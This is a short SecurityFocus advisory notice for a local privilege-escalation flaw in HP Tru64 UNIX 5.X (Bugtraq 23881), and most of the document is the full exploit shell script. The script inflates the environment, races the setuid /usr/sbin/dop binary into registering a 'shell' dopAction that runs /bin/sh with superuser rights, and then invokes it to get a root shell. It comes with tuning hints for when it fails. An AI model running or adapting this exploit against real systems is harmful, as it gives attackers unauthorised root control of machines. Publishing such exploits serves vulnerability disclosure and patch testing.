source: http://www.securityfocus.com/bid/23881/info

HP Tru64 for UNIX is prone to a local privilege-escalation vulnerability.

Exploiting this issue allows local attackers to execute arbitrary code with superuser privileges.
Successful exploits will result in a complete compromise of vulnerable computers. Failed exploit attempts will result in a denial of service. 

---------------------8<---------------------8<---------------------
#!/bin/sh
#
# - Author/Credits:
#   Daniele Calore; orkaan <at> orkaan.org
#
# - Description:
#   HP Tru64 DOP Local Privilege Escalation Vulnerability
#
#   UNIX HP Tru64 5.X '/usr/sbin/dop' Local Vulnerability root escalation.
#   HP Security bulletin code identification: HPSBTU02211 SSRT071326
#   Bugtraq ID: 23881
#
# - Public Released:
#   2007-05-09
#
# - System Affected:
#   Tru64 5.1  (ALL) (Last PatchKit: T64v51B20AS0006-20030210  - PK6 - BL20)
#   Tru64 5.1A (ALL) (Last PatchKit: T64V51AB24AS0006-20031031 - PK6 - BL24)
#   Tru64 5.1B (ALL) (Last PatchKit: T64V51BB27AS0006-20061208 - PK6 - BL26)
#
# - System NOT Tested:
#   Tru64 5.0
#
# - System NOT Affected:
#   Tru64 4.0x (dop will allways require root password, also for user root)
#
# - More info:
#   http://www.orkaan.org/tru64/orkaan_-_exp_Tru64-5.X_SSRT071326.html
#

#
#####################

# Defines:

PATH="/sbin:/usr/sbin/:/bin:/usr/bin"
DOP="/usr/sbin/dop"

# Environment size target.
# Change this value if you have problems.
ENV_TRG=38629

# Sleep in seconds.
# Change this value (bigger) if you have problems.
SLEEP=10

#
#####################
# Credits:

echo "UNIX HP Tru64 5.X '/usr/sbin/dop' Local Vulnerability root escalation."
echo "HP Security bulletin code identification: HPSBTU02211 SSRT071326"
echo "Bugtraq ID: 23881"
echo "Author: Daniele Calore; orkaan <at> orkaan.org"
echo ""

#
#####################
# Checks:

# Check User.
MYUID=`id -u`
if [ ${MYUID} -eq 0 ]; then
        echo "Why execute this if you are allready root?"
        exit 1
fi

# Check dop binary.
test -u "${DOP}"
if [ $? -ne 0 ]; then
        echo "${DOP} binary is without set-user ID bit... Sorry!"
        exit 1
fi

# Check exec_disable_arg_limit.
ARG_LIMIT=`sysconfig -q proc exec_disable_arg_limit 2>/dev/null | tail -1 |\
           cut -f3 -d" "`
if [ "Z${ARG_LIMIT}" != "Z0" ]; then
        echo "exec_disable_arg_limit is set to ${ARG_LIMIT:-none}... Sorry!"
        exit 1
fi

#
#####################
# DOPAction Attack:

echo "Ready:"

# Unset Display.
echo "1- Unset DISPLAY."
unset DISPLAY

# Make ENV big enough.
echo "2- Make ENV big enough."
ENV_SIZE=`env | wc -c | tr -cd '[[:digit:]]'`
ENV_SIZE=`expr ${ENV_TRG} - ${ENV_SIZE} - 3`
A=`perl -e "print 'A' x ${ENV_SIZE}`; export A
ENV_SIZE=`env | wc -c | tr -cd '[[:digit:]]'`
echo "   Actual ENV size is ${ENV_SIZE}; target is ${ENV_TRG};"

# Create dopAction.
echo "3- Create a dopAction 'shell'.
   Remember to delete it.
   As root do:
   /usr/sbin/sysman -cli -delete row -comp doprc -group dopActions -key1
   shell

   Remember:
   - The script will never end.
   - If it does not run change ENV_TRG...
   - It is normal to see a message like:
     Error occurred trying to update /etc/doprc:
     shell already exists in /etc/doprc
     (This mean that the BUG is present...)

   You have to wait ${SLEEP} seconds.
   After this amount of time you will see a: '#' (the root shell prompt).
"

# Fork it in Background.
dop /usr/sbin/sysman -cli -add row -comp doprc -group dopActions \
-data "shell SuperUsers {{/bin/sh *}}" &

# Run the new dopAction.
# Sleep some seconds (maybe you have to change this value).
sleep ${SLEEP}
echo ""
dop shell

exit 0
# EOF
---------------------8<---------------------8<---------------------
